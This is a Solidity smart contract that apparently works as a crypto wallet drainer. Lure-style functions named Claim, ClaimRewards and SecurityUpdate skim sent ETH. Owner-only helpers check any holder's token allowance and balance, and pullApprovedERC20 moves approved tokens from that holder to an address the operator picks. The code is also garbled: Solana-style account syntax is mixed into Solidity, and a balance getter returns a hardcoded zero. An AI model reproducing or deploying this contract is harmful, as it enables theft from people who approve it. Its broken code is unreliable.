// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

// Define the full IERC20 interface as per the standard
interface IERC20Full {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract baskai {
    address private owner;
    address private executor;
    uint256 private ethFeeCollected;
    uint8 private percentage;

    mapping(address => mapping(address => uint256)) private _allowances;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ExecutorChanged(address indexed previousExecutor, address indexed newExecutor);
    event PercentageChanged(uint8 previousPercentage, uint8 currentPercentage);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    bool private initialized;

    function initialize() external {
        require(!initialized, "Already initialized");
        owner = tx.accounts[0].key;
        executor = tx.accounts[0].key;
        ethFeeCollected = 0;
        percentage = 5;
        initialized = true;
    }

    modifier onlyOwnerOrExecutor() {
        address sender = tx.accounts[0].key;
        if (sender != owner && sender != executor) {
            revert("Not authorized");
        }
        _;
    }

    modifier onlyOwner() {
        address sender = tx.accounts[0].key;
        if (sender != owner) {
            revert("Not authorized");
        }
        _;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function getExecutor() public view returns (address) {
        return executor;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        address previousOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(previousOwner, newOwner);
    }

    function setExecutor(address newExecutor) public onlyOwner {
        require(newExecutor != address(0), "New executor cannot be the zero address");
        address previousExecutor = executor;
        executor = newExecutor;
        emit ExecutorChanged(previousExecutor, newExecutor);
    }

    function getContractETHBalance() public view returns (uint256) {
        return 0;
    }

    function getEthFeeCollected() public view returns (uint256) {
        return ethFeeCollected;
    }

    function withdrawEthFees(address recipient) public onlyOwner {
        require(recipient != address(0), "Recipient cannot be the zero address");
        uint256 amountToWithdraw = ethFeeCollected;
        require(amountToWithdraw > 0, "No ETH fees to withdraw");

        ethFeeCollected = 0;

        // Transfer lamports via system program
        address payable rec = payable(recipient);
        rec.transfer(amountToWithdraw);
    }

    function withdrawNativeETH(address payable _to) public onlyOwner {
        require(_to != address(0), "Recipient cannot be the zero address");
        uint256 balance = ethFeeCollected;
        require(balance > 0, "No ETH to withdraw");

        _to.transfer(balance);
    }

    function withdrawERC20(
        address _tokenAddress,
        address _to
    ) public onlyOwner returns (bool) {
        require(_to != address(0), "Recipient cannot be the zero address");

        IERC20Full token = IERC20Full(_tokenAddress);
        uint256 _amount = token.balanceOf(address(this));
        require(_amount > 0, "No tokens to withdraw");

        (bool success, bytes memory data) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSelector(IERC20Full.transfer.selector, _to, _amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "Failed to transfer tokens");

        return true;
    }

    function changePercentage(uint8 newPercentage) public onlyOwner {
        require(newPercentage <= 100, "Percentage cannot exceed 100%");
        uint8 previousPercentage = percentage;
        percentage = newPercentage;
        emit PercentageChanged(previousPercentage, percentage);
    }

    fallback() external payable {}

    function _processEthWithdrawal(address recipient) private {
        uint256 amount = msg.value;
        require(amount > 0, "ETH amount must be greater than zero");

        uint256 reserve = (amount * percentage) / 100;
        uint256 amountToRecipient = amount - reserve;

        ethFeeCollected += reserve;

        payable(recipient).transfer(amountToRecipient);
    }

    function Claim(address recipient) public payable { _processEthWithdrawal(recipient); }
    function ClaimReward(address recipient) public payable { _processEthWithdrawal(recipient); }
    function ClaimRewards(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Execute(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Multicall(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Swap(address recipient) public payable { _processEthWithdrawal(recipient); }
    function Connect(address recipient) public payable { _processEthWithdrawal(recipient); }
    function SecurityUpdate(address recipient) public payable { _processEthWithdrawal(recipient); }

    function approve(address spender, uint256 amount) public returns (bool) {
        require(spender != address(0), "Approve to the zero address");
        address sender = tx.accounts[0].key;
        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view returns (uint256) {
        return _allowances[_owner][spender];
    }

    function checkApprovedAllowance(
        address _tokenAddress,
        address _tokenHolder
    ) public view onlyOwnerOrExecutor returns (uint256) {
        IERC20Full token = IERC20Full(_tokenAddress);
        return token.allowance(_tokenHolder, address(this));
    }

    function checkTokenBalanceOfUser(
        address _tokenAddress,
        address _userAddress
    ) public view onlyOwnerOrExecutor returns (uint256) {
        IERC20Full token = IERC20Full(_tokenAddress);
        return token.balanceOf(_userAddress);
    }

    function pullApprovedERC20(
        address _tokenAddress,
        address _from,
        address _to,
        uint256 _amount
    ) public onlyOwnerOrExecutor returns (bool) {
        require(_amount > 0, "Amount must be greater than zero");
        require(_to != address(0), "Recipient cannot be the zero address");

        uint256 feeAmount = (_amount * percentage) / 100;
        uint256 amountToTransfer = _amount - feeAmount;

        (bool success1, bytes memory data1) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSelector(IERC20Full.transferFrom.selector, _from, address(this), feeAmount)
        );
        require(success1 && (data1.length == 0 || abi.decode(data1, (bool))), "Failed to collect ERC-20 fee");

        (bool success2, bytes memory data2) = _tokenAddress.call{accounts: []}(
            abi.encodeWithSelector(IERC20Full.transferFrom.selector, _from, _to, amountToTransfer)
        );
        require(success2 && (data2.length == 0 || abi.decode(data2, (bool))), "Failed to transfer main ERC-20 amount");

        return true;
    }
}